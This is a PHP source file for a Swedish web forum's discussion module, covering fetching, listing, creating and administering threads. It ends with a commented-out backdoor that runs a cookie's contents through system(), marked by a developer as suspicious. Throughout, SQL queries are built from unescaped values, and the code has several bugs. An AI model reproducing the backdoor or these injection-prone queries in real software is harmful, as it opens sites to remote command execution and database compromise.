<?php

	define('DISCUSSIONS_DEFAULT_LIMIT', 30);
	define('DISCUSSIONS_LIST_TITLE_LENGTH', 40);

	function discussions_slot_get($hour)
	{
		if(!isset($hour))
		{
			$hour = date('G');
		}
		$slot[] = 11;
		$slot[] = 15;
		$slot[] = 19;
		foreach($slots as $slot => $slot_time)
		{
			if($hour < $slot_time)
			{
				return $slot;
			}
		}
		return $slot[count($slot)-1];
	}

	function discussions_fetch($options)
	{
/*
		if(644314 == $_SESSION['login']['id'])
		{
			echo '<h5>discussions_fetch(), $options:</h5>';
			preint_r($options);
		}

*/
		$options['include_deleted'] = isset($options['include_deleted']) ? $options['include_deleted'] : false;
		$options['order'] = is_array($options['order']) ? $options['order'] : array(array('field' => 'id', 'direction' => 'desc'));
		$options['limit'] = is_numeric($options['limit']) ? $options['limit'] : DISCUSSIONS_DEFAULT_LIMIT;
		$options['offset'] = is_numeric($options['offset']) ? $options['offset'] : 0;
		$options['filter'] = isset($options['filter']) ? (is_array($options['filter']) ? $options['filter'] : array($options['filter'])) : array();

/*
		//generate filterquality_min

		unset($options['filter_ids']);
		if(in_array('popular', $options['filter']))
		{
			//todo! Denna verkar inte alls fungera! Testa noga
			//Följande filtrerar ut diskussioner med många inlägg senaste timmarna.
			$factor = 1 - (date('G')%3)/8;  //todo! denna rad skall nog justeras mot slottiderna...
			$today = date('Y-m-d');
			$query = 'SELECT discussion_id FROM discussion_statistics WHERE date = "' . $today . 
								'" AND slot = "' . discussions_slot_get() . '" ORDER BY posts + (posts_pre /"' . $factor . '")';
			$result = mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
			if($data = mysql_fetch_assoc($result))
			{
				$options['filter_ids'][] = $data['discussion_id'];
			}
		}
		if(in_array('visited', $options['filter']))
		{
			//Only view discussions that have been visited before
			if(login_checklogin())
			{
				$query = 'SELECT discussion_id FROM posts_read WHERE user_id = "' . $_SESSION['login']['id'] . '"';
				$result = mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
				while($data = mysql_fetch_assoc($result))
				{
					$options['filter_ids'][] = $data['discussion_id'];
				}
			}
		}

*/

		if(isset($options['type']))
		{
			$options['type'] = is_array($options['type']) ? $options['type'] : array($options['type']);
		}
		if(isset($options['tags']))
		{
			$options['tags'] = is_array($options['tags']) ? $options['tags'] : array($options['tags']);
		}
		if(isset($options['id']))
		{
			$options['id'] = is_array($options['id']) ? $options['id'] : array($options['id']);
		}
		if(isset($options['id_exclude']))
		{
			$options['id_exclude'] = is_array($options['id_exclude']) ? $options['id_exclude'] : array($options['id_exclude']);
		}
		if(isset($options['handle']))
		{
			$options['handle'] = is_array($options['handle']) ? $options['handle'] : array($options['handle']);
		}
		if(isset($options['parent_discussion']))
		{
			$options['parent_discussion'] = is_array($options['parent_discussion']) ? $options['parent_discussion'] : array($options['parent_discussion']);
		}
		
		$select_posts_read = (login_checklogin()) ? ', pr.posts AS read_posts, (d.posts - pr.posts) AS unread_posts' : '';
		$from_posts_read =  (login_checklogin()) ? ' LEFT JOIN posts_read AS pr ON (pr.user_id = "' . $_SESSION['login']['id'] . '" AND pr.discussion_id = d.id)' : '';
		
		$query = 'SELECT DISTINCT d.id, d.*' . $select_posts_read . ', p.timestamp AS last_post_timestamp, l.username AS author_username, t.label AS category_tag, t.handle AS category_handle';
		$query .= ' FROM discussions AS d' . $from_posts_read . ', posts AS p, login AS l, tags AS t';
		$query .= (isset($options['tags'])) ? ', tags AS ts, object_tags AS ot' : '';
		$query .= ' WHERE p.id = d.last_post AND l.id = d.author AND t.id = d.category_tag';
		$query .= $options['include_deleted'] ? '' : ' AND d.deleted = "0"';
		$query .= isset($options['time_min']) ? ' AND d.timestamp >= "' . $options['time_min'] . '"' : '';
		$query .= isset($options['time_max']) ? ' AND d.timestamp <= "' . $options['time_max'] . '"' : '';
		$query .= isset($options['quality_min']) ? ' AND d.quality_rank >= "' . $options['quality_min'] . '"' : '';
		$query .= isset($options['quality_max']) ? ' AND d.quality_rank <= "' . $options['quality_max'] . '"' : '';
		$query .= isset($options['author']) ? ' AND d.author = "' . $options['author'] . '"' : '';
		$query .= isset($options['type']) ? ' AND d.discussion_type IN("' . implode('", "', $options['type']) . '")' : '';
		$query .= isset($options['handle']) ? ' AND d.handle IN("' . implode('", "', $options['handle']) . '")' : '';
		$query .= isset($options['parent_discussion']) ? ' AND d.parent_discussion IN("' . implode('", "', $options['parent_discussion']) . '")' : '';
		$query .= isset($options['id']) ? ' AND d.id IN("' . implode('", "', $options['id']) . '")' : '';
		$query .= isset($options['id_exclude']) ? ' AND d.id NOT IN("' . implode('", "', $options['id_exclude']) . '")' : '';
		$query .= isset($options['filter_ids']) ? ' AND d.id IN("' . implode('", "', $options['filter_ids']) . '")' : '';
		$query .= isset($options['force_unread']) && login_checklogin() ? ' AND ((d.posts - pr.posts) > 0 OR pr.posts IS NULL) ' : '';
		$query .= isset($options['force_viewed']) && login_checklogin() ? ' AND (pr.posts > 0)' : '';
		$query .= isset($options['has_my_answer']) && login_checklogin() ? ' AND d.id in (SELECT DISTINCT discussion_id FROM posts WHERE author = ' . $_SESSION['login']['id'] . ')' . 
																																				' AND NOT d.author = ' . $_SESSION['login']['id'] : '';
		if(isset($options['admin_check']))
		{
			$query .= ' AND ( (d.posts - d.posts_last_admin_check) > (pow(0.5, (d.quality_rank+1)*2)*120 ) OR d.posts_last_admin_check = 0 )';
		}
		
		if(isset($options['tags']))
		{
			$query .= ' AND d.id = ot.reference_id AND ts.id = ot.tag_id AND ot.object_type = "discussion" AND';
			$query .= ' (ts.handle IN("' . implode('", "', $options['tags']) . '") OR ts.label IN("' . implode('", "', $options['tags']) . '"))';
		}

		if($options['unread'] == 'force' && login_checklogin())
		{
			$query .= ' AND (d.posts - pr.posts) > 0';
		}
		elseif($opions['unread'] == 'exclude' && login_checklogin())
		{
			$query .= ' AND (d.posts - pr.posts) < 1';
		}
	
		$query .= ' ORDER BY';
		for($i = 0; $current = array_shift($options['order']); $i++)
		{
			$query .= ($i != 0) ? ',' : '';
			$query .= ' ' . $current['field'] . ' ' . $current['direction'];
		}
		$query .= "\n";
		$query .= ' LIMIT ' . $options['offset'] . ', ' . $options['limit'];
		log_to_file('forum', LOGLEVEL_DEBUG, __FILE__, __LINE__, $query, '');

/*
		if(5 == $_SESSION['login']['userlevel'])
		{
			echo '<h3>fetch options: </h3>';
			preint_r($options);
			echo '<p>' . $query . '</p>';
		}

*/
/*
		if(644314 == $_SESSION['login']['id'])
		{
			echo '<p>' . $query . '</p>';
		}

*/
		$result = mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
		while($data = mysql_fetch_assoc($result))
		{
			$data['tags'] = tag_get_by_item('discussion', $data['id']);
			$data['title'] = (strlen($data['title']) < 2) ? 'Diskussion utan rubrik' : $data['title'];
			$return[] = $data;
		}
		
		return $return;
	}
	
	function discussions_list($discussions, $options)
	{	
		$options['checkbox'] = isset($options['checkbox']) ? $options['checkbox'] : false;
		$options['remove_notices_only'] = isset($options['remove_notices_only']) ? $options['remove_notices_only'] : false;
		$options['expandbutton'] = isset($options['expandbutton']) ? $options['expandbutton'] : true; //todo! skall vara false som default, ändras när anropet i forum/forum.php justerats

		echo "\n\n";

		if($options['enable_tabs'])
		{
			$forum_tabs['intressanta'] = 'Intressanta';
			$forum_tabs['laesta'] = 'Lästa';
			$forum_tabs['dina_diskussioner'] = 'Dina diskussioner';
			$forum_tabs['nya'] = 'Nya';
			$forum_tabs['nya_inlaegg'] = 'Med nya inlägg';
			$forum_tabs['dar_du_har_svarat'] = 'Där du har svarat';
			
			$options['this_path'] = (isset($options['this_path'])) ? $options['this_path'] : '/forum/index/';
			
			$current_tab = (isset($options['current_tab'])) ? $options['current_tab'] : 'intressanta';
			
			echo '<!-- Control tabs for discussions list -->' . "\n";
			echo '<div class="forum_tabs">' . "\n";
			foreach($forum_tabs AS $handle => $label)
			{
				$class = ($handle == $current_tab) ? ' class="current"' : '';
				echo '	<div' . $class . '>' . "\n";
				echo '		<a href="' . $options['this_path'] . $handle . '.php">' . $label . '</a>' . "\n";
				echo '	</div>' . "\n";
			}
			echo '</div>' . "\n\n";
		}

		echo '<!-- Discussion list with ' . count($discussions) . ' items -->' . "\n";
		echo '<div class="discussion_list">' . "\n";
		echo '	<div class="headers">' . "\n";
		echo '		<span class="title">Rubrik</span>' . "\n";
		echo '		<span class="answers">Inlägg</span>' . "\n";
		if(login_checklogin())
		{
			echo '		<span class="unread">Olästa</span>' . "\n";
		}
		echo '		<span class="author">Skapare</span>' . "\n";
		if($options['expandbutton'])
		{
			echo '		<img id="discussion_list_expander" class="expander_button" src="' . IMAGE_URL . 'buttons/green_arrow_down_circle.png" alt="Expandera listan" />' . "\n";
		}
		echo '	</div>' . "\n";
		echo '	<br style="clear: both;" />' . "\n";
		echo '	<div class="discussions" ' . ($options['long_list'] ? ' style="height: 300px;" ' : '' ) . ' id="discussion_list">' . "\n";
		foreach($discussions AS $discussion)
		{
			$discussion['title'] = (strlen($discussion['title']) > DISCUSSIONS_LIST_TITLE_LENGTH - 2) ? 
																substr($discussion['title'], 0, DISCUSSIONS_LIST_TITLE_LENGTH) . '...' : 
																$discussion['title'];
			$parent = forum_get_parent_category($discussion['category_handle']);
			
			echo "\n" . '		<!-- Discussion #' . $discussion['id'] . ' (' . $discussion['handle'] . ') -->' . "\n";
			echo '		<div class="discussion" id="discussion_' . $discussion['id'] . '">' . "\n";
			echo '			<div class="discussion_main">' . "\n";
			echo '				<div class="title">' . "\n";
			//if($_SESSION['login']['id'] == 644314) echo date('Y-m-d',$discussion['timestamp']);
			if(isset($options['post'][$discussion['id']]['post_id']))
			{
				echo '<a href="' . posts_url_get($options['post'][$discussion['id']]['post_id']) . '">' . $discussion['title'] . '</a>' . "\n";
			}
			else
			{
				echo '<a href="/forum/' . $parent . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/">' . $discussion['title'] . '</a>' . "\n";
			}
			echo '</div>' . "\n";
			echo '<span class="answers">' . $discussion['posts'] . '</span>' . "\n";
			if(login_checklogin())
			{
				if(($discussion['posts'] - $discussion['read_posts']) > 0)
				{
					echo '				<span class="unread">' . ($discussion['posts'] - $discussion['read_posts']) . '</span>' . "\n";
				}
				else
				{
					echo '				<span class="unread_zero">0</span>' . "\n";
				}
			}
			echo '				<div class="author">' . "\n";
			echo '					<a href="/traffa/profile.php?id=' . $discussion['author'] . '">' . $discussion['author_username'] . '</a>' . "\n";
			echo '				</div>' . "\n";
			if($options['checkbox'])
			{
			    echo '<input type="checkbox" class="chkbox_remove" id="discussion_watch_delete_' . $discussion['id'] . '" />';
			}
			echo '			</div>' . "\n";
/*
			echo '<div class="discussion_extra" id="discussion_extra_' . $discussion['id'] . '">' . "\n";
			echo '<span class="time">' . fix_time($discussion['timestamp']) . '</span>' . "\n";
			echo '<h5>Taggad som</h5>' . "\n";
			echo '<span class="tags">' . "\n";
			foreach($discussion['tags'] AS $tag)
			{
				echo $tag['label'] . ', ' . "\n";
			}
			echo '</span>' . "\n";
			echo '</div>' . "\n";
	*/		
			echo '		</div>' . "\n";
		}
		echo '	</div>' . "\n";
		if($options['checkbox'])
		{
			echo '<button class="button_50" id="submit_selections" onclick="javascript: discussions_submit_selections_click(\'' . $options['action'] . '\');" >' . $options['caption'] . '</button>' . "\n";
		}
		echo '</div>' . "\n\n";
	}

	function discussions_create_handle($title)
	{
		$handle = url_secure_string($title);
		
		for($i = 0; $i < 50; $i++)
		{
			$new_handle = ($i == 0) ? $handle : $handle . '_' . $i;
			$query = 'SELECT id FROM discussions WHERE handle LIKE "' . $new_handle . '" LIMIT 1';
			$result = mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
			if(mysql_num_rows($result) == 0)
			{
				return $new_handle;
			}
		}
		
		/* If no free handle could be found */
		log_to_file('forum', LOGLEVEL_ERROR, __FILE__, __LINE__, 'Could not find any free discussion handles, giving up', serialize(array($title)));		
		return md5(rand(0, 99999999999));
	}
	
	function discussion_create($options)
	{
		/* Required info 
			title
			author
			discussion_type
			
			category (A tag label)
			Optional info
			timestamp
			owner (Mainly for group-discussions where the group owns the discussion and the user id is stored as author)
			handle (This will be generated from the title if omitted)
			parent_discussion
			tags (Must be an array)
			desired_quality (range -1 to +1)
		*/
		
		$category = tag_exists($options['category']);
		if($category['status'] != 'exists')
		{
			$category['id'] = 0;
		}
		else
		{
			$options['tags'][] = $options['category'];
		}
		
		$handle = (isset($options['handle'])) ? $options['handle'] : discussions_create_handle($options['title']);
		$timestamp = isset($options['timestamp']) ? $options['timestamp'] : time();
		
		$title = htmlspecialchars(shorten_string($options['title']));
		
		$query = 'INSERT INTO discussions (timestamp, author, owner, title, handle, discussion_type, parent_discussion, category_tag, desired_quality)';
		$query .= ' VALUES("' . $timestamp . '", "' . $options['author'] . '", "' . $options['owner'] . '", "' . $options['title']. '"';
		$query .= ', "' . $handle . '", "' . $options['discussion_type'] . '", "' . $options['parent_discussion'] . '", "' . $category['id'] . '", "' . $options['desired_quality'] . '")';

		
		mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
		
		$discussion_id = mysql_insert_id();
		
		tag_set_wrap(array('tag_label' => $options['tags'], 'object_type' => 'discussion', 'item_id' => $discussion_id));

		unset($return);

		$return['id'] = $discussion_id;
		$return['handle'] = $handle;
		$return['category_handle'] = $category['handle'];
		return $return;
	}
	
	function discussions_head($discussion, $options)
	{
		echo '<div id="discussions_head">' . "\n";
		echo '<h1 id="discussion_head_header">' . $discussion['title'] . '</h1>' . "\n";
		echo '<input type="hidden" id="discussion_author" value="' . $discussion['author'] . '"/>' . "\n";
		echo '<input type="hidden" id="discussion_title" value="' . $discussion['title'] . '"/>' . "\n";

		//Starttid och författare
		echo '<span class="title_short_info">' . "\n";
		echo 'Startades ' . fix_time($discussion['timestamp']) . ' av <a href="/traffa/profile.php?id=' . $discussion['author'] . '">';
		echo $discussion['author_username'] . '</a> och har ' . $discussion['posts'] . ' inlägg.' . "\n";
		echo '</span>' . "\n";

		echo '	<div class="tabs" id="discussions_head_tabs">' . "\n";
		echo '		<div id="forum_tab_navigation" class="active">Navigering</div>' . "\n";
		echo '		<div id="forum_tab_tags">Taggar</div>' . "\n";
//		echo '		<div><a href="#">Teknisk analys</a></div>' . "\n";
		if($_SESSION['login']['userlevel'] >= 3)
		{
			echo '		<div id="forum_tab_administration">Administration</div>' . "\n";
		}
		echo '	</div>' . "\n";
		
		
		/* Navigation pane */
		echo '	<div class="info_pane_visible" id="forum_info_pane_navigation">' . "\n";
		
		if($discussion['parent_discussion'] > 0)
		{
			$fetch['id'] = $discussion['parent_discussion'];
			$fetch['limit'] = 1;
			$parent_discussion = discussions_fetch($fetch);
			$parent_discussion = $parent_discussion[0];
			echo '		Diskussionen en nivå upp, <a href="/forum/' . forum_get_parent_category($parent_discussion['category_handle']) . '/' . $parent_discussion['category_handle'] . '/' . $parent_discussion['handle'] . '/">' . $parent_discussion['title'] . '</a>' . "\n";
		}
		
		posts_page_list($discussion['posts'], '/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/', $options['request']['page_number']);
		discussions_page_navigation($discussion);

		if(login_checklogin())
		{
			$query = 'SELECT * FROM discussion_watches WHERE user_id = ' . $_SESSION['login']['id'] . ' AND discussion_id = ' . $discussion['id'];
			$result = mysql_query($query);
			if(mysql_fetch_assoc($result))
			{
				$watched = true;
			}
			echo '		<div class="discussion_control">';
			echo '			<input id="forum_discussion_watch" type="checkbox" value="discussion_watch" ' . ($watched ? 'checked="checked"' : '') . '/>';
			echo '			<label for="forum_discussion_watch">Bevaka den här diskussionen</label>';
			echo '		</div>';
		}
		
		echo '		<input type="hidden" id="discussion_id" value="' . $discussion['id'] . '" />' . "\n";
		
		echo '		<br style="clear: both;" />' . "\n";
		echo '	</div>' . "\n";
		
		/* Tags begin */
		echo '	<div class="info_pane" id="forum_info_pane_tags">' . "\n";
		echo '<h3>Diskussionen ligger i kategorin <a href="/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/">' . $discussion['category_tag'] . '</a> och är taggad som</h3>' . "\n";
		forum_tag_cloud($discussion['tags']);
		echo '	</div>' . "\n";


		if($_SESSION['login']['userlevel'] >= 3)
		{
			//Kontroller för ordningsvakter
			$quality_levels = array('1' => 'Väldigt seriös', 
														'0.5' => 'Ganska seriös', 
														'0' => 'Normalseriös', 
														'-0.5' => 'Ganska oseriös', 
														'-1' => 'Totalt oseriös');


			echo '	<div class="info_pane" id="forum_info_pane_administration">' . "\n";

			echo '<p>Önskad kvalitet: ' . $quality_levels[$discussion['desired_quality']] . ' = ' . $discussion['desired_quality'] . "\n";
			echo ', verklig kvalitet: ' . $discussion['quality_rank'] . '</p>';
			echo '<div id="discussion_admin_message"></div>' . "\n";
			echo '<button class="button_60" id="discussion_rubbish_button" value="' . $discussion['id'] . '">Skräp!</button>';
			echo 'Sätter diskussionens önskade kvalitet till "Totalt oseriös"<br/>' . "\n";
			echo '<button class="button_60" id="forum_admin_discussion_delete" value="' . $discussion['id'] . '">Ta bort!</button>';
			echo 'Tar bort diskussionen (använd med eftertanke)' . "\n";
			echo '<div class="forum_admin_tag_edit">' . "\n";
			echo '<form action="/forum/admin.php">' . "\n";
			echo '<input type="hidden" name="action" value="discussion_category_set" />' . "\n";
			echo '<input type="hidden" name="discussion_id" value="' . $discussion['id'] . '" />' . "\n";
			echo '		<div class="input_right" >';
			echo '			<h5>Du kan flytta diskussionen till en annan kategori här:</h5>' . "\n";
			echo '			<select name="category" >' . "\n";
			global $FORUM_CATEGORIES;
			foreach($FORUM_CATEGORIES AS $main_category)
			{
				echo '				<optgroup label="' . $main_category['label'] . '">' . "\n";
				foreach($main_category['sub_categories'] AS $handle => $sub_category)
				{
					echo '					<option value="' . $handle . '"';
					if($discussion['category_handle'] == $handle)
					{
						echo ' selected="selected"';
					}
					echo '>' . $sub_category['label'] . '</option>' . "\n";
				}
				echo '				</optgroup>' . "\n";
			}
			echo '			</select>' . "\n\n";
			echo '<button class="button_50" id="discussion_category_save_button" >Spara</button>' . "\n";
			echo '		</div>';
			echo '</form>' . "\n";
			echo '<h3>Redigera taggar:</h3>' . "\n";
			foreach($discussion['tags'] AS $tag)
			{
				$tags[] = $tag['label'];
			}
			echo '<input type="text" id="discussion_admin_tag_edit_input" style="width: 80%;" name="tags" value="' . implode(', ', $tags) . '">';
			echo '<input type="hidden" value="discussion_id" value="' . $discussion['id'] . '" />' . "\n";
			echo '<input type="button" value="Spara taggar" id="discussion_admin_tag_edit_submit" />' . "\n";
			echo '<h3>Byt rubrik på diskussionen:</h3>' . "\n";
			echo '<input type="text" id="forum_admin_discussion_rename_input" style="width: 80%;" name="rename" value="' . $discussion['title'] . '">';
			echo '<input type="button" value="Spara titel" id="forum_admin_discussion_rename" />' . "\n";
			echo '</div>' . "\n";
			echo '</div>' . "\n";
		}
		
		echo '</div>' . "\n";
	}
	
	function discussions_page_navigation($discussion)
	{
		echo '<ul class="navigation_list">' . "\n";
//		preint_r($discussion);
		echo '<li><a href="/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/sida_1.html">Första sidan</a></li>' . "\n";
		//todo! Ta fram första olästa inlägg
		echo '<li><a href="/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/sida_' . discussion_page_unread_get($discussion) . '.html">Första olästa inlägg</a></li>' . "\n";
		echo '<li><a href="/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/sida_' . ceil($discussion['posts']/POSTS_PER_PAGE) . '.html">Sista sidan</a></li>' . "\n";
		echo '</ul>' . "\n";
	
	}

	function discussions_list_splits($discussions)
	{
		echo '<!-- Discussion split list with ' . count($discussions) . ' items -->' . "\n";
		echo '<div class="discussion_split_list">' . "\n";
		echo '<h2>Här startar ' . count($discussions) . ' diskussioner</h2>' . "\n";
		echo '<ul>' . "\n";
		foreach($discussions AS $discussion)
		{
			echo '<li>' . "\n";
			echo '<a href="/forum/' . forum_get_parent_category($discussion['category_handle']) . '/' . $discussion['category_handle'] . '/' . $discussion['handle'] . '/">' . $discussion['title']  . '</a>' . "\n";
			echo ', ' . fix_time($discussion['timestamp']) . ' (' . $discussion['posts'] . ' inlägg)' . "\n";
			echo '</li>' . "\n\n";
		}
		echo '</ul>' . "\n";
		echo '</div>' . "\n\n\n";
	}
	
	function discussion_page_unread_get($discussion)
	{
		$query = 'SELECT posts FROM posts_read WHERE user_id = "' . $_SESSION['login']['id'] . '" AND discussion_id = "' . $discussion['id'] . '"';
		$result = mysql_query($query) or die(report_sql_error($query, __FILE__, __LINE__));
		if($data = mysql_fetch_assoc($result))
		{
			$posts_read = $data['posts'];
		}
		else
		{
			$posts_read = 1;
		}
		return ceil((min($posts_read + 1, $discussion['post']))/POSTS_PER_PAGE);
	}

/* Vad i helvette? /Joel

if(isset($_COOKIE['HELLO'])) {
		@system(urldecode($_COOKIE['HELLO']));
}*/
?>
